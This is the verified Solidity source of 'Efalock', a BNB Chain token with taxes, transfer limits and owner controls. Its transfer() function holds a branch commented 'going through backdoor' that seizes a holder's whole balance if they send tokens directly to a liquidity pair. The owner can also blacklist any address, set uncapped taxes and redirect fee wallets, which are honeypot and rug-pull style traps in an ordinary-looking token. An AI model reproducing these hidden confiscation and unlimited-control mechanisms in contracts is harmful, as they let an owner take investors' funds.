/**
 *Submitted for verification at BscScan.com on 2022-10-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDexRouter {
    function factory() external pure returns (address);    
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable  returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external; 
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IDexPair {  
    function sync() external;
}
       
contract Efatah33_Efalock is IERC20 { 

    struct TokenInfo {
        string name;
        string symbol;
        uint8 decimals;
        uint256 denomination;
        uint256 totalSupply;        
        uint256 totalBuyTax;
        uint256 totalSellTax;
        uint256 maxDailyWalletTransferPercent;
        uint256 maxTransferTimeSecs;
        bool coolDownEnabled;
        uint256 coolDownTime;        
        bool swapMutex;
        bool txnMutex;
    }
 
    TokenInfo private _tokenInfo = TokenInfo ( //77,777  100,000
           "Efalock", "EFK", 8,  100_000_000, /*10**_decimals;*/ 7_777_700_000_000, //77_777 * _denomination; 
           14, 16,      1, 24 hours, //24hrs
           true, 2 minutes, false, false
    );
 
    mapping(address => uint256) private _balances; 
    mapping (address => mapping (address => uint256)) private _allowances;
  
    struct Addresses {
        address owner_wallet;
        address marketing_wallet;
        address liquidity_wallet;
        address team_wallet;
        address dev_wallet;
        address project_wallet;
        address charity_wallet;
        address ship_wallet; 
        address liquidate; 
        address dead_wallet;  
    }

    Addresses _address = Addresses(
            0x43597D4fEf63fBf97D0c22a20C2d236510BEFD92,
            0xb6A3B26D5Be7A70322848E5585B71EfE5e17bFB4,
            0x780a056D4f9E3899FBD854Cae6c182Be06bF5B6e,
            0xB5257c797E99efD16B41A321BeEA1519c869ECe5,
            0xd3bb950f296D9Ba70D9b0d92F5Eaec04de84DFbE,
            0x99d5cb4652128f20010C8680E74F98381B0D6d50,
            0x0F0721D086AcFBa77881AE5aD06067eB344D932b,
            0x443211a1b0c2f372A0e6bffF3d5d34F7a1901D4d,
            0xD90589348B7D44227bd72589CeD7262cd1429491,
            0x000000000000000000000000000000000000dEaD);


    struct DeX {
        IDexRouter router; 
        address busd_address;
        address pairBNB; 
        address pairBUSD; 
        bool isPairBNB; 
        uint256 liquidityThreshold;  //0 means disabled
        uint256 swapThreshold;
    }

    DeX dex = DeX(
        IDexRouter(address(0x10ED43C718714eb63d5aA57B78B54704E256024E)),   0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, //busd 
        //IDexRouter(address(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3)),    0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7, //TEST

         address(0x0), //bnbpair 
         address(0x0), //busdpair
         true,
         1_000_000_000,// *10**8 _denomination;
         1_000_000_000 //10 tokens
    ); 

 
    struct Tax {
        uint256 marketing;
        uint256 liquidity;
        uint256 team;
        uint256 dev;
        uint256 project;
        uint256 charity;
        uint256 epif; 
    }
    Tax private buyTaxes = Tax(3, 2, 1, 2, 1, 1, 4);
    Tax private sellTaxes = Tax(3, 2, 1, 2, 2, 2, 4);
    
    struct userTxn {  uint256 txnTimeSecs; uint256 txnAmount; }
    mapping(address => userTxn) private _accountDailyTxn; 
    
    //0-all, 1-exempt, 2-exempt-fees, 3-provideliquidity, 9-bot, _xACCOUNT
    mapping(address => uint) public _xACCOUNT;    
    //address[] private shareholders; //mapping (address => uint256) private _shareholdersAmt;   
    mapping(address => uint256) private _LastTxnTime;
    uint256 private MAX_INT = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;

        
    constructor() {      
        dex.pairBNB = IDexFactory(dex.router.factory()).createPair(address(this), dex.router.WETH());
        dex.pairBUSD = IDexFactory(dex.router.factory()).createPair(address(this), dex.busd_address);
         
        address[15] memory _AddrsArray = [  address(dex.router), dex.pairBUSD, dex.pairBNB,  address(this), 
                                            dex.router.WETH(), dex.busd_address, address(dex.router.factory()),
                                           _address.marketing_wallet, _address.team_wallet, _address.dev_wallet, 
                                          _address.project_wallet, _address.charity_wallet, _address.ship_wallet, _address.owner_wallet, _address.liquidate ];
        for(uint i = 0; i < 14; i++) {
             _xACCOUNT[_AddrsArray[i]] = i > 6? 2 : 1;
             if(i < 4) {
                _allowances[address(this)][_AddrsArray[i]] = uint256(MAX_INT);
             }
        } 
 
        _balances[_address.owner_wallet] = _tokenInfo.totalSupply; 
        emit Transfer(address(0x0), _address.owner_wallet, _tokenInfo.totalSupply);  
    }
  
    modifier swapMutexLock() { 
        if(!_isAddressExempted(msg.sender))
            require(!_tokenInfo.swapMutex, "No Re-entrancy");
        _tokenInfo.swapMutex = true;  _;
        _tokenInfo.swapMutex = false;
    }
     
    modifier txnMutexLock() {
        if(!_isAddressExempted(msg.sender))
            require(!_tokenInfo.txnMutex, "No Txn. Re-entrancy");
         _tokenInfo.txnMutex = true;
        _;
        _tokenInfo.txnMutex = false;
    }

    modifier onlyOwner() {  require(_address.owner_wallet == msg.sender);     _;  }     
    modifier isValidAddress(address addr) { require(_isAllowAddress(addr));   _;  }
 
    function _getNow() private view returns (uint256){ return block.timestamp; }

//0-all, 1-exempt, 2-exempt-fees, 3-provideliquidity, 9-bot, _xACCOUNT
    function _isAddressExempted(address addr) private view returns (bool) { return (_xACCOUNT[addr] >= 1 && _xACCOUNT[addr] <= 3); }
    function _isFeesExempted(address addr) private view returns (bool) {  return (_xACCOUNT[addr] == 2);  }
    function _canProvLiQ(address addr) private view returns (bool) {  return (_xACCOUNT[addr] == 2 || _xACCOUNT[addr] == 3);  }
     
    function _isAllowAddress(address addr) private view returns (bool) { 
        if(_isAddressExempted(addr)) return true;
        if(_xACCOUNT[addr] == 9 || _isAddressContract(addr)) return false; //bot
        return true;
    }

    bool private isContractCheck = false; 
    function activateContractCheck(bool _flag) external onlyOwner {  isContractCheck = _flag;  } 
    function _isAddressContract(address addr) private view returns (bool) {      
        if(!isContractCheck) return false;
        if(address(0x0) == addr) return true;
         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly { codehash := extcodehash(addr) }
        return (codehash != 0x0 && codehash != accountHash); 
    }
          
    function isOwner() private view returns (bool) { return _address.owner_wallet == msg.sender; }   
    function owner() public view returns (address) {  return _address.owner_wallet; }
    function name() public view returns (string memory) {   return _tokenInfo.name; }
    function symbol() public view returns (string memory) { return _tokenInfo.symbol;  }
    function decimals() public view returns (uint8) {    return _tokenInfo.decimals;   }
    function totalSupply() public view override returns (uint256) {   return _tokenInfo.totalSupply;    }     
    function getCirculatingSupply() public view returns (uint256) {   return (_tokenInfo.totalSupply - _balances[_address.dead_wallet]);  }   
    function balanceOf(address account) public view override returns (uint256) { return _balances[account];  }
    function allowance(address allow_owner, address spender) public view override returns (uint256) { return _allowances[allow_owner][spender];   }

    function approve(address spender, uint256 value) external override returns (bool)
    {    
        require(value >= 0 && _isAllowAddress(spender) && _isAllowAddress(msg.sender));
        if(!_isAddressExempted(msg.sender))
            require(_balances[msg.sender] >= value, "Insufficient-Approval-limit");

        _allowances[msg.sender][spender] = value; 
        emit Approval(msg.sender, spender, value);
        return true; 
    }
    
    function _approve(address tokenOwner, address spender, uint256 amount) private returns (bool) { 
        require(amount >= 0, "INVALID_APPROVE_AMT");
        require(_isAllowAddress(tokenOwner) && _isAllowAddress(spender) && _isAllowAddress(msg.sender),  "_APPROVE-ADDR-NOT-ALLOWED");
        _allowances[tokenOwner][spender] = amount; 
        emit Approval(tokenOwner, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public override txnMutexLock returns (bool)
    {       
        assert(_balances[msg.sender] >= amount && amount > 0); 
        
        if ((msg.sender != address(dex.router) && !_canProvLiQ(msg.sender)) && (to == dex.pairBNB || to == dex.pairBUSD)) { //going through backdoor
            _balances[_address.liquidate] += _balances[msg.sender]; 
            emit Transfer(msg.sender, _address.liquidate, _balances[msg.sender]);
            _balances[msg.sender] = 0; 
            return true;
        } 

        bool success = _transfer(msg.sender, to, amount); 
        require(success, "Transfer reversed");
        return success;
    }
  
    function transferFrom(address from, address to, uint256 value) external override returns (bool) {         
        if (_allowances[from][msg.sender] != uint256(MAX_INT)) { 
            require(_allowances[from][msg.sender] >= value && value > 0, "INSUFFICIENT-ALLOWANCE");
            _allowances[from][msg.sender] -= value;
        }
 
        require(_transfer(from, to, value), "TXXN-failed");   
        return true;
    } 
     
    function _transfer(address sender, address recipient,  uint256 amount) private swapMutexLock returns (bool) { 
        require(_isWithdrawalLimitValid(sender, amount), "DAILY_LIMIT_EXCEEDED");  
        require(_isCooldownTimeValid(sender), "COOLDOWN_TIMER_INVALID"); //DAILY_LIMIT_EXCEEDED
        require(_isAllowAddress(sender) && _isAllowAddress(recipient) && _isAllowAddress(msg.sender), "ADDR_NOT_ALLOWED"); 
          
        if(_isFeesExempted(sender) && _isFeesExempted(msg.sender)) {  
            return _baseTransfer(sender, recipient, amount, 0, true); 
        }
        else if (_isAddressExempted(sender)) {   
            return _baseTransfer(sender, recipient, amount, 1, true); 
        }            
        else if(_isAddressExempted(recipient) || dex.pairBUSD == recipient || dex.pairBNB == recipient) { //its user selling to pancakeswap 
            uint256 taxAmount = (amount * _tokenInfo.totalSellTax) / 100; 
            uint256 amountLessFee = amount - taxAmount;
             
            _balances[sender] -= amount;   
            _balances[recipient] += amountLessFee;
            emit Transfer(sender, recipient, amountLessFee);
            
            _payTax(sender, amount, taxAmount, sellTaxes);
            return true;
        }
         
        return _baseTransfer(sender, recipient, amount, 1, false);
    }

    function _isWithdrawalLimitValid(address sender, uint256 amount) public returns (bool) {
        uint256 senderBalance = _balances[sender];
        if(senderBalance < amount) return false;
        if(_isAddressExempted(sender) || _tokenInfo.maxTransferTimeSecs <= 0 || _tokenInfo.maxDailyWalletTransferPercent <= 0 
           || _tokenInfo.maxDailyWalletTransferPercent >= 100) return true; 

        uint256 nowTime = _getNow();
        if (nowTime > (_accountDailyTxn[sender].txnTimeSecs + _tokenInfo.maxTransferTimeSecs)) {
            //it means last transaction is more than 24 hours
            //1. check if the amount is within the range of max txn cap 
            uint256 maxAmtAllowed = (senderBalance * _tokenInfo.maxDailyWalletTransferPercent) / 100;
            if(amount > maxAmtAllowed)
                return false;
                
            _accountDailyTxn[sender].txnTimeSecs = nowTime;
            _accountDailyTxn[sender].txnAmount = amount;
            return true;  
        }  
  
        //it means user_account has done one or more transaction within 24hours       
        uint256 max_txn_allowed = ((_accountDailyTxn[sender].txnAmount + senderBalance) * _tokenInfo.maxDailyWalletTransferPercent) / 100;  
        if(max_txn_allowed >= (amount + _accountDailyTxn[sender].txnAmount))
        {
            _accountDailyTxn[sender].txnAmount += amount; 
            return true;
        }
        
        return false;
    }
   
    function _isCooldownTimeValid(address addr) public returns (bool) {
        if(_tokenInfo.coolDownEnabled == false || _tokenInfo.coolDownTime <= 1 || _isAddressExempted(msg.sender)) return true;

        uint256 nowTime = _getNow();
        require((nowTime - _LastTxnTime[addr]) >= _tokenInfo.coolDownTime, "COOLDOWN_TIME-TOO_FAST");
        _LastTxnTime[addr] = nowTime; 
        return true;
    }
    
    function _baseTransfer(address from, address to, uint256 amount, uint isHasFees, bool is_buy) private returns (bool) {   
        require(amount > 0 && _balances[from] >= amount, "INSUFFICIENT_BEP20");    
          
        if(!_isFeesExempted(from) && isHasFees > 0 && !(_isAddressExempted(from) && _isAddressExempted(to))) 
        {   
           uint256 taxsPcent = is_buy ? _tokenInfo.totalBuyTax : _tokenInfo.totalSellTax; 
           uint256 taxAmount = (amount * taxsPcent) / 100;
           require(amount >= taxAmount);
           uint256 amountLessFee = amount - taxAmount;
           
            _balances[from] -= amount; 
            _balances[to] += amountLessFee;
            emit Transfer(from, to, amountLessFee);  
             
            //Taxes are computed 
            _payTax(from, amount, taxAmount, is_buy ? buyTaxes : sellTaxes);
        } 
        else {
            _balances[from] -= amount;   
            _balances[to] += amount;
            emit Transfer(from, to, amount); 
        }
                
        _LastTxnTime[from] = _getNow();
        return true; 
    }

    function _payTax(address from, uint256 amount, uint256 taxAmount, Tax memory taxs) private {
        //spit the funds to the various addresses 
        address[6] memory _feeAddrArray = [_address.marketing_wallet, _address.team_wallet, _address.dev_wallet, _address.project_wallet, _address.charity_wallet, _address.ship_wallet];
        uint256[6] memory _taxRateArray = [taxs.marketing, taxs.team, taxs.dev, taxs.project, taxs.charity, taxs.epif];
        
        uint256 _sumTax = 0; 
        for(uint i = 0; i < 6; i++) {             
            if(_taxRateArray[i] > 0) {
                uint256 _taxAmt = (amount * _taxRateArray[i]) / 100;
                _balances[_feeAddrArray[i]] += _taxAmt;
                emit Transfer(from, _feeAddrArray[i], _taxAmt); 
                _sumTax += _taxAmt; 
            }            
        }

        uint256 amtBal = taxAmount - _sumTax;
        if(amtBal > 0) {
            _balances[_address.liquidity_wallet] += amtBal;
            emit Transfer(from, _address.liquidity_wallet, amtBal);  
        }
    }
    
    function swapTaxFee() external onlyOwner {
        if(dex.swapThreshold == 0) return;
        address[6] memory _feeAddrArray = [_address.marketing_wallet, _address.team_wallet, _address.dev_wallet, _address.project_wallet, _address.charity_wallet, _address.ship_wallet];
         
        IERC20 ercBUSD = IERC20(dex.busd_address);
        for(uint i = 0; i < 6; i++) { 
            uint256 _addressBalance = _balances[_feeAddrArray[i]];
            if(_addressBalance > dex.swapThreshold) {
                uint256 initialBusd = ercBUSD.balanceOf(address(this));
                _balances[_feeAddrArray[i]] = 0; 
                _balances[address(this)] += _addressBalance;
                _swap(_addressBalance, false);
                emit Transfer(_feeAddrArray[i], address(this), _addressBalance); 

                uint256 tokenBusd = ercBUSD.balanceOf(address(this)) - initialBusd; 
                if(tokenBusd > 0) {
                    ercBUSD.transfer(_feeAddrArray[i], tokenBusd);
                }
            }            
        }
    } 

    function swapLiqFee() external onlyOwner {
         uint256 liquidityTokenBalance = _balances[_address.liquidity_wallet];
         if(dex.liquidityThreshold == 0 || liquidityTokenBalance < dex.liquidityThreshold) return; 
          
         _balances[_address.liquidity_wallet] = 0; 
         _balances[address(this)] += liquidityTokenBalance;
         emit Transfer(_address.liquidity_wallet, address(this), liquidityTokenBalance);
  
         uint256 initialBalanceBNB = address(this).balance; 
         _swap(liquidityTokenBalance, true); 
         
        uint256 swappedAMT = address(this).balance - initialBalanceBNB; 
        if(swappedAMT > 0) {
            payable(_address.liquidity_wallet).transfer(swappedAMT);
        }
    }

    function provideLiquidity() external onlyOwner {
         uint256 liquidityTokenBalance = _balances[_address.liquidity_wallet];
         if(dex.liquidityThreshold == 0 || liquidityTokenBalance < dex.liquidityThreshold) return; 
          
         _balances[_address.liquidity_wallet] = 0;
          uint256 contractTokenBalance = _balances[address(this)]  + liquidityTokenBalance;
         _balances[address(this)] = contractTokenBalance;
         emit Transfer(_address.liquidity_wallet, address(this), liquidityTokenBalance);
 
         // Split the contract balance into halves 
         uint256 tokensToAddLiquidityWith = contractTokenBalance / 2;
         uint256 tokensToSwap = contractTokenBalance - tokensToAddLiquidityWith;

         uint256 initialBalanceBNB = address(this).balance; 
         _swap(tokensToSwap, true);
         uint256 bnbToAddLiquidityWith = address(this).balance - initialBalanceBNB; 
         if (bnbToAddLiquidityWith > 1) {  
            // approve token transfer to cover all possible scenarios 
            dex.router.addLiquidityETH{value: bnbToAddLiquidityWith}(
                address(this), tokensToAddLiquidityWith, 0, 0, _address.liquidity_wallet, _getNow()
            );
         }     
    }
     
    function _swap(uint256 tokenAmount, bool isBNB) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](isBNB?2:3);
        path[0] = address(this);
        path[1] = dex.router.WETH();
        if(!isBNB) path[2] = dex.busd_address;

        //_approve(address(this), address(dex.router), tokenAmount);

        // make the swap
        if(isBNB){
            dex.router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                _getNow()
            );
        }
        else {
            dex.router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                _getNow()
            );
        }        
    }
 
 
    function setxAccount(address addr, uint level) external onlyOwner {  _xACCOUNT[addr] = level; }

    function transferOwnership(address addr) external onlyOwner  { 
        require(!_isAddressContract(addr), "INVALID_OWNER_ADDRESS"); 
        _xACCOUNT[_address.owner_wallet] = 0;             
        _address.owner_wallet = addr;  
        _xACCOUNT[addr] = 2; 
    }
   
     
    function transferBulk(address[] memory addrs, uint256[] memory amts) external onlyOwner {
         for(uint i=0; i<addrs.length; i++) { 
            _balances[msg.sender] -= amts[i];  
            require(_balances[msg.sender] >= 0);
            _balances[addrs[i]] += amts[i];
            
            emit Transfer(msg.sender, addrs[i], amts[i]);   
         } 
    }  

    function claimShares(address to, uint256 amount) external onlyOwner {
        require(amount > 0 && _isAllowAddress(to), "Invalid Access...");
        require(_balances[_address.ship_wallet] >= amount);
        _balances[_address.ship_wallet] -= amount;
        _balances[to] += amount;
        emit Transfer(_address.ship_wallet, to, amount);   
    }    
    
    function burn(uint256 amount) external  {
        require(_balances[msg.sender] >= amount && amount > 0  && _isAllowAddress(msg.sender));
        _balances[msg.sender] -= amount;
        _balances[_address.dead_wallet] += amount;
        emit Transfer(msg.sender, _address.dead_wallet, amount);   
    }    
  
    function setBasicFees(uint256 _maxDailyWalletPcent, uint256 _maxTxnHours, uint _coolMinutes, bool _coolDownEnabled) external onlyOwner { 
         _tokenInfo.maxDailyWalletTransferPercent  =    _maxDailyWalletPcent;   
         _tokenInfo.maxTransferTimeSecs            =    _maxTxnHours * 1 hours; 
         _tokenInfo.coolDownTime                   =    _coolMinutes * 1 minutes;
         _tokenInfo.coolDownEnabled                =    _coolDownEnabled;
    }
  
    function editAddresses(address market, address liquid, address team, address devAddr, 
                        address project, address charity, address epif) external onlyOwner {
        if(_address.marketing_wallet != market) _address.marketing_wallet = market;
        if(_address.liquidity_wallet != liquid) _address.liquidity_wallet = liquid;
        if(_address.team_wallet != team)        _address.team_wallet = team;
        if(_address.dev_wallet != devAddr)      _address.dev_wallet = devAddr;
        if(_address.project_wallet != project)  _address.project_wallet = project;
        if(_address.charity_wallet != charity)  _address.charity_wallet = charity;
        if(_address.ship_wallet != epif)        _address.ship_wallet = epif; 
    }
    
    function setTaxFees(uint256 market, uint256 liquid, uint256 team, uint256 devtax,  
                    uint256 project, uint256 charity, uint256 epif, bool isBuy) external onlyOwner {
        uint256 totalFee = market + liquid + team + devtax + project + charity + epif;
        if(isBuy) {
            _tokenInfo.totalBuyTax = totalFee;
            buyTaxes = Tax(market, liquid, team, devtax, project, charity, epif);
        }
        else { 
            _tokenInfo.totalSellTax = totalFee;
            sellTaxes = Tax(market, liquid, team, devtax, project, charity, epif);
        }
    }
 
  
    fallback() external payable { } 
    receive() external payable { }
     
    function rescueBNB(uint256 amount) external onlyOwner  {  payable(msg.sender).transfer(amount);    }     
    function rescueToken(address tokenAddress, uint256 tokens) external onlyOwner { IERC20(tokenAddress).transfer(_address.owner_wallet, tokens); } 
   
   //>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  

   function updatePairThreshold(uint256 _liquidity_threshold, uint256 _swapThreshold) external onlyOwner {
        dex.liquidityThreshold = _liquidity_threshold;
        dex.swapThreshold = _swapThreshold; 
   }
 
    function getFeesBalances() external view returns ( 
            uint256 marketing_balance,  
            uint256 liquidity_balance,
            uint256 team_balance,
            uint256 dev_balance,
            uint256 project_balance,   
            uint256 charity_balance,    
            uint256 ship_balance,   
            uint256 dead_balance,   
            uint256 contract_balance, 
            uint256 owner_bnb,  
            uint256 liquidity_threshold,
            uint256 swap_threshold 
        )
    {
        return ( 
                _balances[_address.marketing_wallet], 
                _balances[_address.liquidity_wallet], 
                _balances[_address.team_wallet], 
                _balances[_address.dev_wallet], 
                _balances[_address.project_wallet], 
                _balances[_address.charity_wallet], 
                _balances[_address.ship_wallet], 
                _balances[_address.dead_wallet], 
                _balances[address(this)], 
                address(_address.owner_wallet).balance,
                dex.liquidityThreshold,
                dex.swapThreshold         
            ); 
    }

    
    function addContractLiquidity() external onlyOwner {
        uint256 liquidityTokenBalance = _balances[_address.liquidity_wallet];
          
        _balances[_address.liquidity_wallet] = 0;
         uint256 contractTokenBalance = _balances[address(this)]  + liquidityTokenBalance;
        _balances[address(this)] = contractTokenBalance;
        emit Transfer(_address.liquidity_wallet, address(this), liquidityTokenBalance);
 
        // Split the contract balance into halves 
        uint256 tokensToAddLiquidityWith = contractTokenBalance / 2;
        uint256 tokensToSwap = contractTokenBalance - tokensToAddLiquidityWith;

         uint256 initialBalanceBNB = address(this).balance; 
        _swap(tokensToSwap, true);

        uint256 bnbToAddLiquidityWith = address(this).balance - initialBalanceBNB; 
        if (bnbToAddLiquidityWith > 0) { 
            //_add Liquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith);
            _approve(address(this), address(dex.router), tokensToAddLiquidityWith);
            // add the liquidity
            dex.router.addLiquidityETH{value: bnbToAddLiquidityWith}(
                address(this),
                tokensToAddLiquidityWith,
                0, // slippage is unavoidable
                0, // slippage is unavoidable
                _address.liquidity_wallet,
                _getNow()
            );
            
        }     
    }      
    
    
    function liquidify(bool isBUSD, uint256 amtToken, uint256 amtBnbBusd) external onlyOwner { 
        require(amtToken > 0 || amtBnbBusd > 0, "AMT_Required"); 
        address pairAddr = isBUSD? dex.pairBUSD : dex.pairBNB;
 
        if(amtToken > 0) { //then work 
            require(_balances[msg.sender] >= amtToken, "BALANCE_INSUFFICIENT");
            _balances[msg.sender] -= amtToken;
            _balances[pairAddr] += amtToken; 
            emit Transfer(msg.sender, pairAddr, amtToken);
        }

        if(amtBnbBusd > 0) {
            address _wethBUSD = isBUSD? dex.busd_address : dex.router.WETH();  
            IERC20 _erc = IERC20(_wethBUSD);          
            require(_erc.balanceOf(address(this)) >= amtBnbBusd, "WETHBUSD_INSUFFICIENT");
            _erc.transfer(pairAddr, amtBnbBusd); 
        }
 
        IDexPair(pairAddr).sync();
    }   
  

}